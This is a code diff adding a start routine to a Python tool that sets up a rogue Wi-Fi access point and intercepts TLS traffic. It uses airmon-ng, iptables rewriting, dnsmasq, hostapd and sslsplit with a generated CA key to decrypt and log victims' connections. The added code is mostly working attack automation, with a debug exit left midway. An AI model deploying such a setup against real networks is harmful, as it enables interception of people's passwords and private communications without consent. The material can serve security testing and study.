@@ -5,6 +5,9 @@ import subprocess
 
 from os.path import isfile
 
+SSL_PORT = '8443'
+TCP_PORT = '8080'
+
 
 # Create the sslsplit directory structure
 def create_structure(config):
@@ -41,3 +44,89 @@ def generate_certs(save_dir):
         stderr=subprocess.PIPE
     )
     p.wait()
+
+
+# Start SSL Split
+def start(tmp_dir_iptables, iptables_conf, interface, hostapd_conf, connections_log, log_dir, keys_dir):
+    # Checking processes with airmon-ng
+    res = subprocess.call(
+        "airmon-ng check kill".split(" "),
+        stdout=subprocess.PIPE
+    )
+    style.print_call_info(res, "airmon-ng", "Killed unwanted processes.")
+
+    # Unblocking wifi if needed
+    res = subprocess.call("rfkill unblock wifi".split(" "), stdout=subprocess.PIPE)
+    style.print_call_info(res, "rfkill", "Unblocked Wifi (Soft and Hardware mode)")
+
+    # Saving actual iptables rules to restore it after stopping the ap
+    res = subprocess.call(
+        "iptables-save > {}".format(tmp_dir_iptables).split(" "),
+        shell=True,
+        stdout=subprocess.PIPE
+    )
+    style.print_call_info(res, "iptables", "Saved actual iptables rules")
+
+    # Flushing iptables
+    res = subprocess.call(
+        "iptables -t nat -F".split(" "),
+        stdout=subprocess.PIPE
+    )
+    style.print_call_info(res, "iptables", "Flushed iptables rules")
+
+    # Starting dnsmasq service
+    res = subprocess.call("service dnsmasq start".split(" "), stdout=subprocess.PIPE)
+    style.print_call_info(res, "dnsmasq", "Started dnsmasq service")
+
+    # Loading iptables rules for SSLSplit and hostapd
+    print("iptables-restore {}".format(iptables_conf))
+    exit(1)
+    res = subprocess.call(
+        "iptables-restore {}".format(iptables_conf).split(" "),
+        shell=True
+        # stdout=subprocess.PIPE
+    )
+    style.print_call_info(res, 'iptables', 'Updated iptables rules for SSL Split')
+
+    # Confiuguring interface
+    res = subprocess.call(
+        "ifconfig {} 10.0.0.1/24 up".format(interface).split(" "),
+        stdout=subprocess.PIPE
+    )
+    style.print_call_info(res, "ifconfig", "Configured interface")
+
+    # Enabling IP forward
+    res = subprocess.call(
+        "sysctl -w net.ipv4.ip_forward=1".split(" "),
+        stdout=subprocess.PIPE
+    )
+    style.print_call_info(res, "ip_forward", "Enabled IP forwarding")
+
+    # Starting hostapd
+    subhostapd = subprocess.Popen(
+        [
+            'xterm', '-T', 'Hostapd console',
+            '-hold', '-e',
+
+            'hostapd', '-d', hostapd_conf
+        ]
+    )
+    style.print_call_info(0, "hostapd", "Started hostapd")
+
+    # Starting SSL Split
+    subssl = subprocess.Popen(
+        [
+            'xterm', '-T', 'SSL Split console', '-e',
+
+            'sslsplit', '-D',
+            '-l', connections_log,
+            '-S', log_dir,
+            '-k', "{}/ca.key".format(keys_dir),
+            '-c', "{}/ca.crt".format(keys_dir),
+            'ssl', '0.0.0.0', SSL_PORT,
+            'tcp', '0.0.0.0', TCP_PORT
+        ]
+    )
+    style.print_call_info(0, "sslsplit", "Started SSLSplit")
+
+    return subhostapd, subssl
